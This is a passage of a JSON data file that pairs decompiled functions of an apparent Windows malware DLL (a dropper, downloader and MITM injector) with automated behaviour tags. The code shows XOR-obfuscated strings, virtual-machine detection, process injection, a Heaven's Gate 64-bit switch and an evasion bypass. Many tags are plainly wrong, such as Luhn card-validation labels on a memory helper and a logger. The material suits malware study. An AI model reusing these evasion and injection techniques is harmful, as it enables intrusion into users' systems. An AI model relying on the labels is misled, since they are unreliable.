(*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_ch);\n        (*pcVar7)(uVar5);\n        uVar5 = (*pcVar8)(0, iVar3);\n        (*pcVar7)(uVar5);\n    }\ncode_r0x0040be29:\n    *0x427dd4 = *0x427dd0 >> 0x20;\n    *0x427ddc = *0x427dd8 >> 0x20;\n    *0x427dcc = *0x427dc8 >> 0x20;\n    *0x427dc4 = *0x427dc0 >> 0x20;\n    return var_10h;\n}\n",
        "token_count": 2621
    },
    "0040790a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040790a(void)\n\n{\n    uint uVar1;\n    code *pcVar2;\n    uint var_48h;\n    uint var_24h;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint var_14h;\n    uint lpModuleName;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    lpModuleName = 0x6e72656b;\n    var_ch = 0x32336c65;\n    var_8h = 0x6c6c642e;\n    var_4h._0_1_ = 0;\n    var_24h = str.GetNativeSystemIDigitalProductIdSOFTWAREMicrosoftWindows_NTCup._0_4_;\n    uStack36 = str.GetNativeSystemIDigitalProductIdSOFTWAREMicrosoftWindows_NTCup._4_4_;\n    uStack32 = str.GetNativeSystemIDigitalProductIdSOFTWAREMicrosoftWindows_NTCup._8_4_;\n    uStack28 = str.GetNativeSystemIDigitalProductIdSOFTWAREMicrosoftWindows_NTCup._12_4_;\n    var_14h = 0x6f666e;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(&lpModuleName, &var_24h);\n    pcVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n    if (pcVar2 != NULL) {\n        (*pcVar2)(&var_48h);\n        if (var_48h == 9) {\n            *0x427d3c = 1;\n            *0x427620 = 2;\n        }\n    }\n    return;\n}\n",
        "token_count": 373
    },
    "0040a0c6": {
        "rules": [
            "decompress data using aPLib/06666ba0b6a14a5481e4ee6eb664d454"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040a0c6(uchar *param_1, int32_t param_2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    char16_t *pcVar3;\n    \n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, 0x4e);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    pcVar3 = 0x417d6c;\n    if (param_2 == 0) {\n        pcVar3 = L\"%08X%04X%04X%04X%08X%04X\";\n    }\n    if (iVar2 != 0) {\n        (*_sym.imp.USER32.dll_wsprintfW)\n                  (iVar2, pcVar3, CONCAT31(CONCAT21(CONCAT11(*param_1, param_1[1]), param_1[2]), param_1[3]), \n                   CONCAT11(param_1[4], param_1[5]), CONCAT11(param_1[6], param_1[7]), CONCAT11(param_1[8], param_1[9])\n                   , CONCAT31(CONCAT21(CONCAT11(param_1[10], param_1[0xb]), param_1[0xc]), param_1[0xd]), \n                   CONCAT11(param_1[0xe], param_1[0xf]));\n    }\n    return iVar2;\n}\n",
        "token_count": 318
    },
    "0040ef21": {
        "rules": [
            "decompress data using aPLib/06666ba0b6a14a5481e4ee6eb664d454"
        ],
        "decompiled_code": "\nuint fcn.0040ef21(void)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    code *pcVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint uVar8;\n    int32_t iVar9;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint32_t var_32h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint32_t var_1ch;\n    uchar var_18h;\n    uint var_14h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    int32_t lpLibFileName;\n    uint var_4h;\n    \n    var_5ch = 0xf01faf00;\n    var_58h = 0x505600;\n    var_54h = 0x8002700;\n    var_50h = 0xc2900;\n    var_4ch = 0x56900;\n    var_48h = 0x3ff00;\n    var_44h = 0x1c4200;\n    var_40h = 0x163e00;\n    var_4h = 0;\n    var_24h = 0x3434382a;\n    var_20h = 0x1c775018;\n    var_1ch = var_1ch & 0xff000000 | 0x661b04;\n    var_14h = 0x66776878;\n    var_10h = var_10h & 0xff000000 | 0x59644c;\n    fcn.00401000(0xb);\n    iVar9 = 0;\n    do {\n        var_ch = 7;\n        puVar1 = iVar9 + lpLibFileName;\n        iVar6 = iVar9 % 7;\n        iVar9 = iVar9 + 1;\n        *puVar1 = *(&var_14h + iVar6) ^ puVar1[&var_24h - lpLibFileName];\n    } while (iVar9 < 0xb);\n    fcn.00403bde(\"GTK DLL: vm_detection.cpp:%d > DetectBadMacAddress : decrypt (char) %s -> %s\", 0x7f);\n    var_2ch = 0x371b2d16;\n    var_28h = 0x15331d11;\n    var_24h = 0x36213d37;\n    var_20h = 0x1a331a23;\n    var_1ch = 0x3f133137;\n    var_18h = 0x52;\n    var_14h = 0x53725843;\n    var_10h = 0x74566f52;\n    fcn.00401000(0x15);\n    iVar9 = var_ch;\n    uVar7 = 0;\n    uVar8 = 0;\n    do {\n        puVar1 = uVar7 + var_ch;\n        uVar3 = uVar7 & 0x80000007;\n        if (uVar3 < 0) {\n            uVar3 = (uVar3 - 1 | 0xfffffff8) + 1;\n        }\n        uVar7 = uVar7 + 1;\n        *puVar1 = *(&var_14h + uVar3) ^ puVar1[&var_2ch - var_ch];\n    } while (uVar7 < 0x15);\n    fcn.00403bde(\"GTK DLL: vm_detection.cpp:%d > DetectBadMacAddress : decrypt (char) %s -> %s\", 0x80);\n    uVar4 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(lpLibFileName, iVar9);\n    pcVar5 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar4);\n    if (pcVar5 == NULL) {\n        var_4h = 0;\n    }\n    else {\n        (*pcVar5)(&var_3ch);\n        uVar7 = var_32h;\n        var_32h = var_32h & 0xffffff;\n        uVar3 = 0;\n        do {\n            if (((uVar7 & 0xff0000) >> 8 | (var_32h << 0x10 | uVar7 & 0xff00) << 8) == (&var_5ch)[uVar3]) {\n                uVar8 = 1;\n            }\n            uVar3 = uVar3 + 1;\n            var_4h = uVar8;\n        } while (uVar3 < 8);\n    }\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar9);\n    pcVar5 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar8);\n    uVar8 = (*pcVar2)(0, lpLibFileName);\n    (*pcVar5)(uVar8);\n    return var_4h;\n}\n",
        "token_count": 1198
    },
    "004103d0": {
        "rules": [
            "64-bit execution via heavens gate/41888d14e91b4c9e83f5980fa2a0ad87"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.004103d0(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint arg_10h)\n\n{\n    code **extraout_ECX;\n    uint32_t uVar1;\n    \n    fcn.00410425(0x33);\n    uVar1 = extraout_ECX[2] + 1 & 0xfe;\n    do {\n        uVar1 = uVar1 - 1;\n    } while (uVar1 != 0);\n    (**extraout_ECX)();\n    return;\n}\n",
        "token_count": 184
    },
    "00401000": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401000(int32_t arg_8h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t *in_ECX;\n    \n    // [00] -r-x section size 65536 named .text\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, arg_8h + 1);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    *in_ECX = iVar2;\n    if (iVar2 != 0) {\n        sub.ntdll.dll_memset(iVar2, 0, arg_8h + 1);\n    }\n    return;\n}\n",
        "token_count": 153
    },
    "004013d8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __fastcall fcn.004013d8(uint param_1, uint param_2)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    uint uVar3;\n    uchar *puVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    code *pcVar8;\n    code *pcVar9;\n    char *pcVar10;\n    char *pcVar11;\n    uint var_64h;\n    uint var_5dh;\n    uint var_59h;\n    uint var_55h;\n    uint var_51h;\n    uint var_4dh;\n    uint var_49h;\n    uint var_45h;\n    uint var_41h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    int32_t hObject;\n    uint ARG_0;\n    int32_t var_28h;\n    uint var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    uint pSessionId;\n    uint *dwProcessId;\n    uchar *var_10h;\n    uchar *var_ch;\n    uint var_8h;\n    int32_t TokenHandle;\n    \n    pcVar8 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    TokenHandle = 0;\n    ARG_0 = param_2;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, 0x208);\n    pcVar9 = _sym.imp.KERNEL32.dll_HeapAlloc;\n    puVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    var_24h = 0x104;\n    var_10h = puVar4;\n    uVar3 = (*pcVar8)(0, 0x208);\n    var_ch = (*pcVar9)(uVar3);\n    var_20h = 0x104;\n    var_1ch = 0;\n    var_8h = 0;\n    pSessionId = 0;\n    iVar5 = 0;\n    if ((puVar4 != NULL) && (var_ch != NULL)) {\n        hObject = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x400, 0, dwProcessId);\n        pcVar9 = _sym.imp.KERNEL32.dll_HeapFree;\n        if (hObject != 0) {\n            for (iVar5 = 0x208; iVar5 != 0; iVar5 = iVar5 + -1) {\n                *puVar4 = 0;\n                puVar4 = puVar4 + 1;\n            }\n            puVar4 = var_ch;\n            for (iVar5 = 0x208; iVar5 != 0; iVar5 = iVar5 + -1) {\n                *puVar4 = 0;\n                puVar4 = puVar4 + 1;\n            }\n            iVar5 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(hObject, 0x20008, &TokenHandle);\n            if ((iVar5 != 0) || (TokenHandle == 0)) {\n                iVar5 = (*_sym.imp.KERNEL32.dll_ProcessIdToSessionId)(dwProcessId, &pSessionId);\n                pcVar2 = _sym.imp.ADVAPI32.dll_GetTokenInformation;\n                if (iVar5 != 0) {\n                    (*_sym.imp.ADVAPI32.dll_GetTokenInformation)(TokenHandle, 1, 0, 0, &var_8h);\n                    iVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                    if (iVar5 == 0x7a) {\n                        uVar3 = (*pcVar8)(0, var_8h);\n                        dwProcessId = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n                        if (dwProcessId != NULL) {\n                            iVar5 = (*pcVar2)(TokenHandle, 1, dwProcessId, var_8h, &var_8h);\n                            if (iVar5 != 0) {\n                                iVar5 = (*_sym.imp.ADVAPI32.dll_LookupAccountSidW)\n                                                  (0, *dwProcessId, var_10h, &var_24h, var_ch, &var_20h, &var_34h);\n                                if (iVar5 != 0) {\n                                    var_64h._0_2_ = 0x3836;\n                                    var_28h = 7;\n                                    var_64h._2_1_ = 7;\n                                    stack0xffffff9b = 0x3a650339;\n                                    var_5dh = 0x76427165;\n                                    var_59h = 0x5f692b50;\n                                    var_55h = 0xc391e38;\n                                    var_51h = 0x4b654c65;\n                                    var_4dh = 0x40506542;\n                                    var_49h = 0x1e381669;\n                                    var_45h = 0xd657539;\n                                    var_41h._0_2_ = 0x3865;\n                                    var_41h._2_1_ = 0x42;\n                                    var_3ch = 0x39423865;\n                                    var_38h._0_2_ = 0x6550;\n                                    var_38h._2_1_ = 0x69;\n                                    fcn.00401000(0x4c);\n                                    iVar5 = var_1ch;\n                                    iVar7 = 0;\n                                    do {\n                                        puVar1 = iVar7 + var_1ch;\n                                        iVar6 = iVar7 % var_28h;\n                                        iVar7 = iVar7 + 1;\n                                        *puVar1 = *(&var_3ch + iVar6) ^ puVar1[&var_64h - var_1ch];\n                                    } while (iVar7 < 0x26);\n                                    pcVar11 = \"wszSessionTemplate_EncryptedStackedBuffer\";\n                                    uVar3 = 0x44;\n                                    pcVar10 = \n                                    \"GTK DLL: bodyspawner.cpp:%d > ExtractProcessOwner : decrypt (wide char) %s -> %ws\";\n                                    iVar7 = var_1ch;\n                                    fcn.00403bde(\"GTK DLL: bodyspawner.cpp:%d > ExtractProcessOwner : decrypt (wide char) %s -> %ws\"\n                                                 , 0x44);\n                                    (*_sym.imp.USER32.dll_wsprintfW)\n                                              (ARG_0, iVar5, var_ch, var_10h, pSessionId, pcVar10, uVar3, pcVar11, iVar7\n                                              );\n                                    pcVar8 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                                    var_1ch = 1;\n                                    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar5);\n                                    pcVar9 = _sym.imp.KERNEL32.dll_HeapFree;\n                                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n                                }\n                            }\n                            uVar3 = (*pcVar8)(0, dwProcessId);\n                            (*pcVar9)(uVar3);\n                        }\n                    }\n                }\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(TokenHandle);\n            }\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(hObject);\n            puVar4 = var_10h;\n        }\n        uVar3 = (*pcVar8)(0, var_ch);\n        (*pcVar9)(uVar3);\n        uVar3 = (*pcVar8)(0, puVar4);\n        (*pcVar9)(uVar3);\n        iVar5 = var_1ch;\n    }\n    return iVar5;\n}\n",
        "token_count": 1690
    },
    "00401636": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nbool __fastcall fcn.00401636(uint param_1)\n\n{\n    uint8_t *puVar1;\n    int16_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint *puVar7;\n    char *pcVar8;\n    uint uVar9;\n    char *pcVar10;\n    uint lpString;\n    uint lpExitTime;\n    uint lpUserTime;\n    uint lpKernelTime;\n    uint var_30h;\n    int32_t hObject;\n    int32_t var_28h;\n    uint lpCreationTime;\n    uint var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar5 = 0;\n    iVar6 = 8;\n    puVar7 = &lpCreationTime;\n    for (iVar3 = iVar6; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    var_28h = 0;\n    puVar7 = &lpExitTime;\n    var_30h = param_1;\n    for (iVar3 = iVar6; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    puVar7 = &lpKernelTime;\n    for (iVar3 = iVar6; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    puVar7 = &lpUserTime;\n    for (; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    puVar7 = &lpString;\n    for (iVar3 = 0x104; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    hObject = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x400, 0, param_1);\n    if (hObject == 0) {\n        (*_sym.imp.KERNEL32.dll_GetLastError)();\n        fcn.00403bde(\"GTK DLL: bodyspawner.cpp:%d > IsProcessAlreadyOwned : Process not opened {%d}\", 0x74);\n        goto code_r0x00401807;\n    }\n    iVar3 = (*_sym.imp.KERNEL32.dll_GetProcessTimes)(hObject, &lpCreationTime, &lpExitTime, &lpKernelTime, &lpUserTime);\n    if (iVar3 == 0) {\n        (*_sym.imp.KERNEL32.dll_GetLastError)();\n        fcn.00403bde(\"GTK DLL: bodyspawner.cpp:%d > IsProcessAlreadyOwned : GetProcessTimes failed {%d}\", 0x80);\n    }\n    else {\n        var_18h = 0x61610162;\n        var_14h = 0x6a337104;\n        var_10h = 0x4c7c7c40;\n        var_ch._0_1_ = 0x49;\n        var_8h = 0x444c6547;\n        var_4h._0_2_ = 0x4934;\n        var_4h._2_1_ = 0x4b;\n        fcn.00401000(0xd);\n        iVar3 = var_1ch;\n        iVar6 = 0;\n        iVar5 = &var_18h - var_1ch;\n        do {\n            var_1ch = 7;\n            puVar1 = iVar6 + iVar3;\n            iVar4 = iVar6 % 7;\n            iVar6 = iVar6 + 1;\n            *puVar1 = *(&var_8h + iVar4) ^ puVar1[iVar5];\n        } while (iVar6 < 0xd);\n        pcVar10 = \"szOwnedProcessAtomTemplate_EncryptedStackedBuffer\";\n        uVar9 = 0x84;\n        pcVar8 = \"GTK DLL: bodyspawner.cpp:%d > IsProcessAlreadyOwned : decrypt (char) %s -> %s\";\n        iVar5 = iVar3;\n        fcn.00403bde(\"GTK DLL: bodyspawner.cpp:%d > IsProcessAlreadyOwned : decrypt (char) %s -> %s\", 0x84);\n        (*_sym.imp.USER32.dll_wsprintfA)\n                  (&lpString, iVar3, var_30h, var_20h, lpCreationTime, pcVar8, uVar9, pcVar10, iVar5);\n        fcn.00403bde(\"GTK DLL: bodyspawner.cpp:%d > IsProcessAlreadyOwned : AtomName : %s\", 0x87);\n        iVar2 = (*_sym.imp.KERNEL32.dll_FindAtomA)(&lpString);\n        if (iVar2 == 0) {\n            iVar2 = (*_sym.imp.KERNEL32.dll_GlobalFindAtomA)(&lpString);\n            if (iVar2 == 0) {\n                (*_sym.imp.KERNEL32.dll_GlobalAddAtomA)(&lpString);\n                (*_sym.imp.KERNEL32.dll_AddAtomA)(&lpString);\n                uVar9 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar9);\n                iVar5 = 1;\n                goto code_r0x004017fe;\n            }\n        }\n        fcn.00403bde(\"GTK DLL: bodyspawner.cpp:%d > IsProcessAlreadyOwned : pid %d already owned\", 0x8a);\n        uVar9 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar9);\n        iVar5 = var_28h;\n    }\ncode_r0x004017fe:\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(hObject);\ncode_r0x00401807:\n    return iVar5 == 0;\n}\n",
        "token_count": 1420
    },
    "0040196c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040196c(uint arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t arg_8h_00;\n    uchar *puVar5;\n    uint *puVar6;\n    uchar auStack48 [4];\n    uint uStack44;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    \n    puVar5 = auStack48;\n    for (iVar2 = 0x10; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    iVar4 = 0;\n    arg_8h_00 = 0;\n    uStack40 = arg_8h;\n    iVar2 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x43a, 0, arg_8h);\n    if (iVar2 == 0) {\n        (*_sym.imp.KERNEL32.dll_GetLastError)();\n        fcn.00403bde(\"GTK DLL: bodyspawner.cpp:%d > MITMInjectDllHooker : Process not opened {%d}\", 0xda);\n    }\n    else {\n        puVar6 = &uStack44;\n        for (iVar3 = 0x18; iVar3 != 0; iVar3 = iVar3 + -1) {\n            *puVar6 = 0;\n            puVar6 = puVar6 + 1;\n        }\n        uStack28 = 0x4400;\n        uStack44 = 0x423220;\n        uStack40 = 0;\n        uStack24 = 0x6200;\n        uStack36 = 0x41d010;\n        uStack32 = 0;\n        (*_sym.imp.KERNEL32.dll_GetCurrentProcess)();\n        iVar3 = fcn.00401815();\n        if (iVar3 != 0) {\n            iVar3 = fcn.00401815();\n            arg_8h_00 = -(iVar3 != 0) & 0x10;\n        }\n        do {\n            iVar3 = fcn.00408805(arg_8h_00);\n            if (iVar3 == 0) break;\n            (*_sym.imp.KERNEL32.dll_Sleep)(0x32);\n            iVar4 = iVar4 + 1;\n        } while (iVar4 < 0x14);\n        fcn.00403bde(\"GTK DLL: bodyspawner.cpp:%d > MITMInjectDllHooker : Injecting into %u status %u\", 0xf1);\n        pcVar1 = _sym.imp.KERNEL32.dll_CloseHandle;\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n        (*pcVar1)(iVar2);\n    }\n    return 0;\n}\n",
        "token_count": 641
    },
    "00403a41": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint16_t * __cdecl fcn.00403a41(int16_t **arg_8h)\n\n{\n    int16_t iVar1;\n    int16_t *in_ECX;\n    int16_t *piVar2;\n    int16_t *piVar3;\n    int16_t *piVar4;\n    int16_t *piVar5;\n    \n    if ((in_ECX == NULL) && (in_ECX = *arg_8h,  *arg_8h == NULL)) {\n        return NULL;\n    }\n    do {\n        piVar2 = in_ECX;\n        piVar4 = 0x41814c;\n        do {\n            iVar1 = *piVar4;\n            piVar4 = piVar4 + 1;\n            if (iVar1 == 0) {\n                piVar4 = piVar2 + 1;\n                if (*piVar2 == 0) {\n                    *arg_8h = NULL;\n                    return NULL;\n                }\n                do {\n                    piVar3 = piVar4;\n                    piVar5 = 0x41814c;\n                    piVar4 = piVar3 + 1;\n                    do {\n                        iVar1 = *piVar5;\n                        piVar5 = piVar5 + 1;\n                        if (iVar1 == *piVar3) {\n                            if (*piVar3 == 0) {\n                                piVar4 = NULL;\n                            }\n                            else {\n                                *piVar3 = 0;\n                            }\n                            *arg_8h = piVar4;\n                            return piVar2;\n                        }\n                    } while (iVar1 != 0);\n                } while( true );\n            }\n            in_ECX = piVar2 + 1;\n        } while (*piVar2 != iVar1);\n    } while( true );\n}\n",
        "token_count": 383
    },
    "00403bde": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.00403bde(uint lpString, uint arglist)\n\n{\n    bool bVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint dwErrCode;\n    uint var_1h;\n    \n    iVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n    iVar6 = 0;\n    uVar3 = (*_sym.imp.KERNEL32.dll_lstrlenA)(lpString);\n    iVar5 = iVar2;\n    do {\n        uVar7 = uVar3;\n        uVar3 = uVar7 + 0x200;\n        if (iVar6 != 0) {\n            uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n            iVar6 = 0;\n        }\n        if (0xa00000 < uVar3) {\ncode_r0x00403c8e:\n            bVar1 = true;\n            goto code_r0x00403c5f;\n        }\n        uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, uVar7 + 0x201);\n        iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n        if (iVar6 == 0) goto code_r0x00403c8e;\n        iVar5 = (*_sym.imp.SHLWAPI.dll_wvnsprintfA)(iVar6, uVar3, lpString, &arglist);\n    } while ((iVar5 < 0) || (uVar7 + 0x1ff <= iVar5));\n    bVar1 = false;\ncode_r0x00403c5f:\n    *(iVar5 + iVar6) = 0;\n    if (!bVar1) {\n        fcn.00403b95();\n        uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n    }\n    (*_sym.imp.KERNEL32.dll_SetLastError)(iVar2);\n    return;\n}\n",
        "token_count": 508
    },
    "00403c92": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00403c92(uint32_t *arg_8h)\n\n{\n    uint32_t uVar1;\n    uint32_t *puVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint in_EDX;\n    uint *arg_10h;\n    uint *arg_14h;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar2 = arg_8h;\n    arg_14h = &var_4h;\n    arg_10h = &arg_8h;\n    arg_8h[1] = 0;\n    *arg_8h = 0;\n    while( true ) {\n        var_4h = 0;\n        arg_8h = NULL;\n        iVar4 = fcn.0040461b(in_EDX, 0, arg_10h, arg_14h);\n        uVar3 = arg_8h;\n        if (iVar4 != 0) break;\n        fcn.00403bde(\"GTK DLL: downloader.cpp:%d > GetRemoteFile : ContentLength=%d, BodyFile.cbData=%d\", 0x25);\n        if (uVar3 == 0) break;\n        uVar1 = *puVar2;\n        if (uVar1 < uVar3) {\n            (*_sym.imp.KERNEL32.dll_Sleep)(10000);\n            fcn.0040cff1();\n        }\n        else {\n            if (uVar1 < 5) break;\n            if (*puVar2[1] == uVar1) goto code_r0x00403d29;\n        }\n        puVar2[1] = 0;\n        *puVar2 = 0;\n    }\n    fcn.0040cff1();\ncode_r0x00403d29:\n    return *puVar2 != 0;\n}\n",
        "token_count": 408
    },
    "00404f5e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00404f5e(void)\n\n{\n    uint8_t *puVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint uVar7;\n    uint *puVar8;\n    int32_t iVar9;\n    uint lpBuffer;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_14h = 0x2f29455a;\n    var_10h = 0x390b2a26;\n    var_ch = 0x4c483739;\n    puVar8 = &lpBuffer;\n    for (iVar5 = 0x104; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    var_8h._0_2_ = 0x474d;\n    var_18h = 0;\n    var_8h._2_1_ = 0x6e;\n    fcn.00401000(8);\n    iVar5 = var_4h;\n    iVar9 = 0;\n    iVar3 = &var_14h - var_4h;\n    do {\n        var_4h = 7;\n        puVar1 = iVar9 + iVar5;\n        iVar6 = iVar9 % 7;\n        iVar9 = iVar9 + 1;\n        *puVar1 = *(&var_ch + iVar6) ^ puVar1[iVar3];\n    } while (iVar9 < 8);\n    fcn.00403bde(\"GTK DLL: dropper_dll.cpp:%d > IsTrustedComp : decrypt (char) %s -> %s\", 0x129);\n    iVar3 = (*_sym.imp.KERNEL32.dll_GetEnvironmentVariableA)(iVar5, &lpBuffer, 0x104);\n    uVar7 = var_18h;\n    pcVar2 = _sym.imp.KERNEL32.dll_lstrlenA;\n    if (iVar3 == 0) {\n        fcn.00403bde(\"GTK DLL: dropper_dll.cpp:%d > IsTrustedComp : GetEnvironmentVariableA failed\", 0x135);\n    }\n    else {\n        (*_sym.imp.KERNEL32.dll_lstrlenA)(&lpBuffer);\n        fcn.00403ab2();\n        fcn.00403bde(\"GTK DLL: dropper_dll.cpp:%d > IsTrustedComp : Crc32 crackme : %p\", 0x12d);\n        (*pcVar2)(&lpBuffer);\n        iVar3 = fcn.00403ab2();\n        if (iVar3 == -0x69b4c9f2) {\n            fcn.00403bde(\"GTK DLL: dropper_dll.cpp:%d > IsTrustedComp : MemoryDetectionRoutine : bypass : is trustedcomp\"\n                         , 0x130);\n            uVar7 = 1;\n        }\n    }\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar5);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n    return uVar7;\n}\n",
        "token_count": 741
    },
    "0040569c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "terminate thread"
        ],
        "decompiled_code": "\nvoid fcn.0040569c(void)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = 0;\n    do {\n        (*_sym.imp.KERNEL32.dll_TerminateThread)(*(uVar1 + 0x427cd0), 0);\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(*(uVar1 + 0x427cd0));\n        uVar1 = uVar1 + 4;\n    } while (uVar1 < 0x40);\n    return;\n}\n",
        "token_count": 114
    },
    "0040611c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create or open file"
        ],
